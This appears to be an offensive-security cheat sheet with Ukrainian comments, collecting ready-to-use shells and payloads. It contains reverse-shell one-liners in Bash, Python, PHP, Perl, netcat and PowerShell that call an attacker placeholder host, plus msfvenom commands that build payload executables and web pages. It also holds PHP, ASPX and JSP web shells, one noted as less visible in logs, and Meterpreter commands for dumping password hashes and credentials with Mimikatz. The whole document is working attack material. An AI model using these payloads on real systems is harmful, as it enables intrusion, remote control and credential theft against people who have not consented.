# Shells & Payloads

## Listeners
```bash
rlwrap nc -lvnp 443
# Metasploit multi/handler:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP>; set LPORT 443; run -j
```

---

## Reverse Shells — Linux

```bash
# Bash TCP:
bash -i >& /dev/tcp/<ATTACKER>/443 0>&1
# або через /bin/sh (якщо bash не працює):
exec 5<>/dev/tcp/<ATTACKER>/443; cat <&5 | while read l; do $l 2>&5 >&5; done

# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP:
php -r '$s=fsockopen("<ATTACKER>",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl:
perl -e 'use Socket;$i="<ATTACKER>";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# nc з -e (BusyBox, Alpine):
nc <ATTACKER> 443 -e /bin/sh
# nc без -e:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER> 443 >/tmp/f
```

---

## Reverse Shells — Windows

```powershell
# PowerShell TCP:
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($r,0,$r.Length)}"

# powercat (якщо вже є на цілі):
powercat -c <ATTACKER> -p 443 -e cmd

# msfvenom exe:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=443 -f exe -o s.exe
# msfvenom Meterpreter:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=443 -f exe -o m.exe
# msfvenom DLL:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=443 -f dll -o s.dll
# msfvenom ASP/ASPX:
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=443 -f aspx -o s.aspx
```

---

## Web Shells

```php
# PHP minimal:
<?php system($_GET['cmd']); ?>
# PHP з виводом:
<?php echo shell_exec($_GET['cmd']); ?>
# PHP з POST (менш видно в логах):
<?php system($_POST['cmd']); ?>
```

```aspx
<!-- ASPX -->
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])); %>
```

```jsp
<!-- JSP для Tomcat -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## Стабілізація TTY (Linux shell → повноцінний термінал)

```bash
# Метод 1 — Python pty:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 columns 200   # підлаштуй під свій термінал

# Метод 2 — script:
script /dev/null -c bash
```

---

## Meterpreter — корисні команди

```
background          # повернути сесію у фон
sessions -l         # список сесій
sessions -i <id>    # підключитись до сесії
getsystem           # спроба автоматичного PrivEsc
getuid              # поточний юзер
migrate <pid>       # переміститись у інший процес (для стабільності)
hashdump            # дамп SAM хешів (потрібен SYSTEM)
upload /path/local /path/remote
download /path/remote /path/local
shell               # cmd.exe всередині meterpreter
load kiwi           # завантажити Mimikatz
creds_all           # всі креди через kiwi
run post/multi/recon/local_exploit_suggester   # PrivEsc suggester
```

**Зв'язки:** [[File-Transfers]] · [[Bypasses]] · [[Linux-PrivEsc]] · [[Windows-PrivEsc]]
